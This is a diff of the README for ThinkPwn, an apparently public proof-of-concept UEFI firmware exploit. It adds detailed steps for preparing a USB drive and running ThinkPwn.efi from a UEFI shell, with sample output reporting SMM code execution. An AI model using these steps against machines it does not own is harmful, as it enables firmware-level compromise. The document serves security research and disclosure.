@@ -91,26 +91,48 @@ To build exploit from the source code on Windows with Visual Studio compiler you
 
 To test exploit on your own hardware:
 
-  1. Prepare FAT32 formatted USB flash drive with ThinkPwn.efi and UEFI Shell (https://github.com/tianocore/tianocore.github.io/wiki/Efi-shell) binaries.
+  1. Prepare FAT32 formatted USB flash drive with ThinkPwn.efi and [UEFI Shell binaries](https://github.com/tianocore/tianocore.github.io/wiki/Efi-shell).
+  
+  You may also want to acquire the EFI shell directly without having to build it yourself from the TianoCore EDK [here](https://github.com/tianocore/edk2/tree/master/ShellBinPkg) , ensuring that you read the applicable limitations.
 
-  2. Boot into the UEFI shell and execute ThinkPwn.efi application.
+  2. Boot into the UEFI shell and execute ThinkPwn.efi application as follows:
 
-
+(a). Download the [ThinkPwn.efi](https://github.com/Cr4sh/ThinkPwn/blob/master/ThinkPwn.efi) binary. 
+(b). Download the EFI shell from the [TianoCore EDK repository](https://github.com/tianocore/edk2/tree/master/ShellBinPkg).
+(c). Rename the EFI shell from the TianoCore EDK repository to *shellx64.efi*. That name is needed by Asus and other AMI Aptio x86_64 UEFI firmware based motherboards (from Sandy Bridge onwards) that provide an option called *"Launch EFI Shell from filesystem device"* . 
+(d). Copy both EFI binaries to a FAT 32 formatted USB drive, and when done, reboot the host PC to the UEFI firmware settings. Modern Linux distributions will allow you to boot straight to the UEFI settings/setup on supported motherboards.
+(e). In your device's firmware, locate the *"Launch EFI shell from filesystem device"* (Usually under Save options in the Aptio CSU menu, in the *"Boot override"* section.). You may be able to replicate the same behavior using an alternate EFI boot manager such as rEFInd and rEFIt, or a similar configuration option in your firmware settings. 
+  
 Usage example:
 
-FS1:\> ThinkPwn.efi
+    FS1:\> ThinkPwn.efi
+    
+    SMM access protocol is at 0xaa5f8b00
+    Available SMRAM regions:
+     * 0xad000000:0xad3fffff
+    SMM base protocol is at 0xaa989340
+    Buffer for SMM communicate call is allocated at 0xacbfb018
+    Obtaining FvFile(7C79AC8C-5E6C-4E3D-BA6F-C260EE7C172E) image handles...
+     * Handle = 0xa4aee798
+       Communicate() returned status 0x0000000e, data size is 0x1000
+     * Handle = 0xa4aee298
+       Communicate() returned status 0x00000000, data size is 0x1000
+    SmmHandler() was executed, exploitation success!
 
-SMM access protocol is at 0xaa5f8b00
-Available SMRAM regions:
- * 0xad000000:0xad3fffff
-SMM base protocol is at 0xaa989340
-Buffer for SMM communicate call is allocated at 0xacbfb018
-Obtaining FvFile(7C79AC8C-5E6C-4E3D-BA6F-C260EE7C172E) image handles...
- * Handle = 0xa4aee798
-   Communicate() returned status 0x0000000e, data size is 0x1000
- * Handle = 0xa4aee298
-   Communicate() returned status 0x00000000, data size is 0x1000
-SmmHandler() was executed, exploitation success!
+On some tested hardware, this may result in an immediate reboot to the firmware settings menu.
+If you wish to capture the output before the reboot, you may pipe the EFI's binary output to a log file as shown below for later analysis:
+
+    FS1:\> ThinkPwn.efi > log.txt
+    
+    SMM access protocol is at 0x5d862c00
+    Available SMRAM regions:
+     * 0x5f000000:0x5f7fffff
+    SMM base protocol is at 0x5ef44298
+    Buffer for SMM communicate call is allocated at 0x5d92c018
+    Obtaining FvFile(7C79AC8C-5E6C-4E3D-BA6F-C260EE7C172E) image handles...
+    ERROR: Image handles was not found
+
+That was the output generated from an Asus G750JM-DS71 notebook SKU running the latest firmware version as to date. (BIOS version .207).
 
 
 Written by:
@@ -118,3 +140,4 @@ Dmytro Oleksiuk (aka Cr4sh)
 
 cr4sh0@gmail.com
 http://blog.cr4.sh
+
